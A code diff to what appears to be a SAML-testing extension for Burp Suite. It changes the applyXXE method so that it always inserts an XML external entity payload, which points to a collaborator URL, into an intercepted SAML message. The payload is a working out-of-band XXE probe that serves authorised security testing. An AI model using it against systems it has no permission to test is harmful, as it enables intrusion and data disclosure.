@@ -608,17 +608,20 @@ public class SamlTabController implements IMessageEditorTab, Observer {
 	}
 	
 	public void applyXXE(String collabUrl) {
-		String dtd = "\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \""+collabUrl+"\"> %xxe; ]>";
+		String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
 		String[] splitMsg = orgSAMLMessage.split("\\?>");
-		if(splitMsg.length != 2) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XXE);
+		if(splitMsg.length == 2) {
+			SAMLMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
 		}
 		else {
-			SAMLMessage = splitMsg[0]+"?>"+dtd+splitMsg[1];
-			textArea.setText(SAMLMessage.getBytes());
-			isEdited = true;
-			setInfoMessageText(XXE_CONTENT_APPLIED);
+			String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
+			SAMLMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
 		}
+		textArea.setText(SAMLMessage.getBytes());
+		isEdited = true;
+		setRawMode(true);
+		samlGUI.getActionPanel().setRawModeEnabled(true);
+		setInfoMessageText(XXE_CONTENT_APPLIED);
 	}
 
 	public void applyXSLT(String collabUrl) {
